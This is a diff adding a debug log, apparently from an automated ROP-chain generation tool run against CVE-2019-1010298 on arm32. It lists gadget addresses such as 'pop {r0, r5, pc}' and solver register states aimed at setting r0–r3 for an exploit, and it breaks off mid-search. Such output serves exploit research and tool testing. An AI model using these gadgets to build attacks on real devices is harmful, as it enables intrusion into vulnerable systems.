@@ -1,0 +1,732 @@
+2026-07-18 08:15:49.068 | INFO     | __main__:main:272 - Testing 3 CVE cases
+2026-07-18 08:15:49.068 | INFO     | __main__:main:279 - 
+============================================================
+2026-07-18 08:15:49.069 | INFO     | __main__:main:280 - [1/3] CVE-2019-1010298
+2026-07-18 08:15:49.069 | INFO     | __main__:main:281 - ============================================================
+2026-07-18 08:15:49.072 | INFO     | __main__:run_one:73 - Arch: arm32, thumb=True
+2026-07-18 08:15:49.086 | INFO     | __main__:run_one:86 - Loaded 6878 gadgets
+2026-07-18 08:15:49.091 | INFO     | __main__:run_one:90 - Memory map: 2 regions, regs: sp=0x0
+2026-07-18 08:15:49.093 | INFO     | __main__:run_one:121 - Targets: [('r0', '0x8dc74c20'), ('r1', '0x1000'), ('r2', '0x7'), ('r3', '0xa')]
+2026-07-18 08:15:49.094 | INFO     | __main__:run_one:147 - Redirected sp to controllable mem: sp=0x8dc74c24, entry via ['r0']
+2026-07-18 08:15:49.094 | INFO     | __main__:run_one:219 - offset_list: 30 slots, address_map: {0: '0xdeadbeef'}
+2026-07-18 08:15:49.094 | INFO     | __main__:run_one:226 - Adjusted virtual_mem_base to 0x8dc80000
+2026-07-18 08:15:49.229 | INFO     | find_reg_gadget_chain:main:953 - Get Set Reg Edges
+2026-07-18 08:15:50.717 | INFO     | find_reg_gadget_chain:main:1002 - Find Reg Setting Gadget Chain
+2026-07-18 08:15:50.717 | INFO     | find_reg_gadget_chain:main:1003 - Target Register ['r0', 'r1', 'r2', 'r3']
+2026-07-18 08:15:51.331 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:15:51.334 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:15:51.336 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:15:51.337 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db02114']
+2026-07-18 08:15:51.337 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, pc}
+2026-07-18 08:15:51.400 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:15:51.407 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:15:51.407 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:15:51.408 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db03200']
+2026-07-18 08:15:51.408 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, pc}
+2026-07-18 08:15:51.922 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:15:51.927 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:15:51.929 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f962']
+2026-07-18 08:15:51.930 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r4, pc}
+2026-07-18 08:15:51.933 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:15:52.117 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:15:52.117 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:15:52.122 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:15:52.124 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0502c']
+2026-07-18 08:15:52.125 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r5, pc}
+2026-07-18 08:15:52.134 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:15:52.137 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:15:52.218 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:15:52.264 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:15:52.302 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:52.305 | DEBUG    | solve_engine:check:1627 - ['pop {r3, pc}']
+2026-07-18 08:15:52.305 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648624, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:52.311 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:15:52.312 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db04eaa']
+2026-07-18 08:15:52.312 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r5, pc}
+2026-07-18 08:15:52.365 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:52.367 | DEBUG    | solve_engine:check:1627 - ['pop {r2, pc}']
+2026-07-18 08:15:52.368 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648624, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:52.373 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:15:52.375 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0b612']
+2026-07-18 08:15:52.375 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r6, pc}
+2026-07-18 08:15:52.390 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [], 'r2': [], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:52.483 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:52.537 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:15:52.549 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:15:52.842 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:52.845 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r4, pc}']
+2026-07-18 08:15:52.845 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:52.922 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:52.971 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:15:52.995 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:15:53.024 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:53.026 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r5, pc}']
+2026-07-18 08:15:53.027 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:53.033 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:15:53.034 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2b132']
+2026-07-18 08:15:53.034 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r6, pc}
+2026-07-18 08:15:53.129 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:53.131 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:53.132 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ede6']
+2026-07-18 08:15:53.132 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r3, r7, pc}
+2026-07-18 08:15:53.144 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:53.171 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:15:53.178 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:53.180 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r5, pc}']
+2026-07-18 08:15:53.181 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:53.184 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:15:53.185 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db055c6']
+2026-07-18 08:15:53.185 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, pc}
+2026-07-18 08:15:53.199 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:15:53.209 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:53.211 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r6, pc}']
+2026-07-18 08:15:53.211 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:53.215 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:15:53.216 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0a3c4']
+2026-07-18 08:15:53.216 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r4, r5, pc}
+2026-07-18 08:15:53.246 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:53.331 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114'], ['0x8db04eaa']]}
+2026-07-18 08:15:53.408 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114'], ['0x8db04eaa']]}
+2026-07-18 08:15:53.493 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:15:53.532 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:15:53.778 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:15:53.836 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:15:53.857 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:53.861 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:53.867 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:53.873 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:53.983 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:53.986 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r6, pc}']
+2026-07-18 08:15:53.986 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:53.991 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:53.992 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db12578']
+2026-07-18 08:15:53.993 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r6, pc}
+2026-07-18 08:15:54.042 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:54.122 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:54.124 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r3, r7, pc}']
+2026-07-18 08:15:54.124 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:54.131 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:15:54.132 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2be20']
+2026-07-18 08:15:54.132 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r2, r6, pc}
+2026-07-18 08:15:54.188 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1f962'], ['0x8db1ede6']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:54.223 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:54.226 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r4, r5, pc}']
+2026-07-18 08:15:54.226 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:54.233 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:15:54.234 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db12578']
+2026-07-18 08:15:54.234 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r6, pc}
+2026-07-18 08:15:54.238 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:54.241 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, pc}']
+2026-07-18 08:15:54.241 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:54.247 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:15:54.249 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db07f9c']
+2026-07-18 08:15:54.249 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r6, r7, pc}
+2026-07-18 08:15:54.264 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:54.293 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:54.294 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1f962'], ['0x8db1ede6']], 'r2': [['0x8db03200'], ['0x8db0a3c4']], 'r3': [['0x8db02114']]}
+2026-07-18 08:15:54.358 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1f962'], ['0x8db1ede6']], 'r2': [['0x8db03200'], ['0x8db0a3c4']], 'r3': [['0x8db02114'], ['0x8db055c6']]}
+2026-07-18 08:15:54.394 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:15:54.412 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:15:54.422 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:54.474 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:54.912 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:54.991 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:55.122 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:15:55.139 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:15:55.168 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:55.172 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:55.176 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r6, pc}']
+2026-07-18 08:15:55.176 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:55.180 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:55.180 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db09e6c']
+2026-07-18 08:15:55.181 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r6, pc}
+2026-07-18 08:15:55.192 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1ede6'], ['0x8db1f962']], 'r2': [['0x8db03200'], ['0x8db0a3c4']], 'r3': [['0x8db055c6'], ['0x8db02114']]}
+2026-07-18 08:15:55.255 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:55.293 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:55.296 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r2, r6, pc}']
+2026-07-18 08:15:55.296 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:55.300 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:55.300 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db09e6c']
+2026-07-18 08:15:55.301 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r6, pc}
+2026-07-18 08:15:55.310 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20']], 'r2': [['0x8db03200'], ['0x8db0a3c4']], 'r3': [['0x8db055c6'], ['0x8db02114']]}
+2026-07-18 08:15:55.367 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:55.418 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:55.446 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:55.449 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r6, pc}']
+2026-07-18 08:15:55.450 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:55.454 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:15:55.455 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ed72']
+2026-07-18 08:15:55.455 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r6, r7, pc}
+2026-07-18 08:15:55.465 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114']]}
+2026-07-18 08:15:55.513 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:55.519 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:55.522 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r6, r7, pc}']
+2026-07-18 08:15:55.523 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:55.526 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:15:55.526 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ede6']
+2026-07-18 08:15:55.527 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r3, r7, pc}
+2026-07-18 08:15:55.537 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:15:55.628 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:55.742 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:15:55.781 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
